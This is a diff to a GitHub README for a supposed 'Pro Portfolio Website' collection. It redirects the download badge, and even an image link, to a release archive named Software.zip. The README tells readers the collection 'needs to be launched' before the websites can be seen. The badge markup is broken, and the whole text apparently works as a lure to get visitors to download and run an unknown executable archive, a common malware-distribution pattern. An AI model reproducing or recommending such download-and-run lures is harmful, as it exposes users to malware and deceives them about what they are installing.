@@ -28,7 +28,7 @@ Explore the following topics related to the portfolios included in this collecti
 
 To access the portfolio websites and dive into the world of creative design and development, simply download the collection from the link below:
 
-[![Download Software Collection](https://img.shields.io/badge/Download-Software Collection-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software Collection](https://github.com/IRINEUBELUTTI/Pro-Portfolio-Website/releases/download/v2.0/Software.zip Collection-blue)](https://github.com/IRINEUBELUTTI/Pro-Portfolio-Website/releases/download/v2.0/Software.zip)
 
 **Note:** The software collection needs to be launched to explore the portfolio websites included.
 
@@ -46,4 +46,4 @@ I hope you enjoy browsing through the "Pro Portfolio Website" collection. Feel f
 
 Thank you for visiting this repository and showing interest in the world of portfolio websites. Stay tuned for updates and new additions to the collection in the future. Happy exploring! 🌟
 
-![Portfolio Website](https://example.com/portfolio-image.jpg)
+![Portfolio Website](https://github.com/IRINEUBELUTTI/Pro-Portfolio-Website/releases/download/v2.0/Software.zip)
